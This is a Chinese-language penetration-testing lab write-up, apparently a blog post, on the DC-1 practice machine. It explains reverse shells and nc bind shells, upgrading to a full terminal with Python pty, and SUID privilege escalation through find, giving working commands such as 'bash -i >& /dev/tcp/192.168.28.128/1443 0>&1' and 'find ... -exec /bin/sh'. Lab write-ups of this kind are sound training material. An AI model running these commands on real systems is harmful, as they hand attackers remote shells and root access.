  

渗透测试初体验：DC-1靶场（遗留问题）

当我们拿到一个webshell的时候，我们能够执行一些命令，但是这些命令都是非交互的，也就是说不存在上下文的概念。当我们想使用vim、top等命令时，webshell就无能为力了。

## 一、反弹shell

（meterpreter其实就是做了如下的作用，获取一个反弹shell，非交互式）

1、攻击机使用nc命令监听端口

nc –lvp 1443（l:监听、p:端口、v：显示详细信息）监听端口并显示详细信息

瑞士NC（NETCAT）常用方法：参考如下文档

https://blog.csdn.net/qin9800/article/details/114045534

2、靶机使用如下命令反弹shell(需要能在靶机中执行相关命令)

bash -i >& /dev/tcp/192.168.28.128/1443 0>&1

bash –i:启动交互式命令bash

>&将输出重定向到文件

/dev/tcp：靶机为Linux的设备/dev/tcp连接程序启动socket(Linux系统:所有程序都是目录文件)

192.168.0.10/4444：连接的ip和端口(即本地计算机)

0>&1：远程的输入和输出(消息呈现方式为远程)

![1660398234_62f7aa9acd19d7c87f995.png!small?1660398235876](https://image.3001.net/images/20220813/1660398234_62f7aa9acd19d7c87f995.png!small?1660398235876)

可以看到上下键无法使用，这是反弹shell

![1660398240_62f7aaa0c4ff0904f8328.png!small?1660398241312](https://image.3001.net/images/20220813/1660398240_62f7aaa0c4ff0904f8328.png!small?1660398241312)

## 二、python pty 方式

反弹shell并不完美，很多命令无法执行，因此就可以通过python pty的方式获取一个比较完美的shelll。

这种方式有个前提是对方机器上必须有python，我这里通过rpm查询对方主机是否存在python

#pty是python中的一个虚拟终端库

#spawn函数：创建一个进程并将其控制终端与当前进程的标准io连接

python -c 'import pty; pty.spawn("/bin/bash")'

![1660398247_62f7aaa75a7439b7c0400.png!small?1660398248171](https://image.3001.net/images/20220813/1660398247_62f7aaa75a7439b7c0400.png!small?1660398248171)

## 三、suid提权的方式

谈到suid提权，就要先说一下下面的权限图。rwx分别是可读、可写、可执行权限

那么suid提权就是用的下图的S权限，可以赋予和取消S权限。

![1660398257_62f7aab114baaa5d1dcf9.png!small?1660398257963](https://image.3001.net/images/20220813/1660398257_62f7aab114baaa5d1dcf9.png!small?1660398257963)

SUID (Set
UID)是Linux中的一种特殊权限,其功能为用户运行某个程序时，如果该程序有SUID权限，那么程序运行为进程时，进程的属主不是发起者，而是程序文件所属的属主。但是SUID权限的设置只针对二进制可执行文件,对于非可执行文件设置SUID没有任何意义.

  

​ 在执行过程中，调用者会暂时获得该文件的所有者权限,且该权限只在程序执行的过程中有效.
通俗的来讲,假设我们现在有一个可执行文件ls,其属主为root,当我们通过非root用户登录时,如果ls设置了SUID权限,我们可在非root用户下运行该二进制可执行文件,在执行文件时,该进程的权限将为root权限.

利用此特性,我们可通过SUID进行提权

### 1、 suid权限的设置

chmod u+s filename 设置SUID位

chmod u-s filename 去掉SUID设置

首先我们看一下没有设置suid权限的文件的权限，新建一个suid.sh文件，然后赋予777的权限，可以看到是rwxrwxrwx

![1660398271_62f7aabf175c35b58a2b9.png!small?1660398271743](https://image.3001.net/images/20220813/1660398271_62f7aabf175c35b58a2b9.png!small?1660398271743)

chmod u+s suid.sh

可以看到已经变成了rwsrwxrwx，就有了suid的权限

![1660398276_62f7aac4627666cd7b27e.png!small?1660398277369](https://image.3001.net/images/20220813/1660398276_62f7aac4627666cd7b27e.png!small?1660398277369)

### 2、 找出系统中具有suid权限的命令

以下命令可以找到正在系统上运行的所有SUID可执行文件。准确的说，这个命令将从/目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到/dev/null，从而仅列出该用户具有访问权限的那些二进制文件。

find / -user root -perm -4000 -print 2>/dev/null

![1660398287_62f7aacf4538f65b93d2d.png!small?1660398288018](https://image.3001.net/images/20220813/1660398287_62f7aacf4538f65b93d2d.png!small?1660398288018)

![1660398292_62f7aad482e6b6674352e.png!small?1660398293081](https://image.3001.net/images/20220813/1660398292_62f7aad482e6b6674352e.png!small?1660398293081)

可以看到find命令确实是属主为root的suid命令，DC1就是用的 find命令进行的提权从操作

find / -perm -u=s -type f 2>/dev/null

![1660398297_62f7aad97b982b9d81524.png!small?1660398298075](https://image.3001.net/images/20220813/1660398297_62f7aad97b982b9d81524.png!small?1660398298075)

find / -user root -perm -4000 -exec ls -ldb {} ;

这个命令执行不了，估计个版本有关系

  

### 3、 find提权

我们已经知道了find命令有suid的权限，那么我们接下来看一下如何使用

使用find执行的命令都将以root权限的身份去运行

touch test.txt #必须要有这个文件

find test.txt -exec whoami \;(格式不能错，否则会运行不成功)

![1660398304_62f7aae03891100485c3c.png!small?1660398304561](https://image.3001.net/images/20220813/1660398304_62f7aae03891100485c3c.png!small?1660398304561)

可以看到是以root权限执行的whoami命令

#进入shell

find test.txt -exec '/bin/sh' \;（可以持续性以root权限运行命令）

![1660398309_62f7aae59e0d5ce7cd27d.png!small?1660398310100](https://image.3001.net/images/20220813/1660398309_62f7aae59e0d5ce7cd27d.png!small?1660398310100)

 **NC** **广播获取shell**

靶机：广播shell

find test.txt -exec nc -lvp 4444 -e '/bin/sh' \；

攻击机：

nc 靶机IP 4444

![1660398317_62f7aaed3b60a5f20addb.png!small?1660398318167](https://image.3001.net/images/20220813/1660398317_62f7aaed3b60a5f20addb.png!small?1660398318167)

  

 **反弹shell**

跟第一章节的反弹shell一直，此处就是利用find提权运行bash –i的命令

攻击机：

nc –lvp 4444

![1660398374_62f7ab2620e970ff4e2a4.png!small?1660398374490](https://image.3001.net/images/20220813/1660398374_62f7ab2620e970ff4e2a4.png!small?1660398374490)

靶机：

find test.txt -exec bash -c 'bash -i >& /dev/tcp/192.168.28.128/4444 0>&1' \;

![1660398379_62f7ab2b8b1918089ff25.png!small?1660398380055](https://image.3001.net/images/20220813/1660398379_62f7ab2b8b1918089ff25.png!small?1660398380055)

  

## 四、sessions的使用方法

Sessions:查看保存的session

Session –i:使用session 1/2/3

![1660398393_62f7ab39af675ba18fae8.png!small?1660398394412](https://image.3001.net/images/20220813/1660398393_62f7ab39af675ba18fae8.png!small?1660398394412)

  

## 参考文档：

<https://www.freebuf.com/articles/web/272617.html>  

https://blog.csdn.net/qin9800/article/details/114045534

  

  

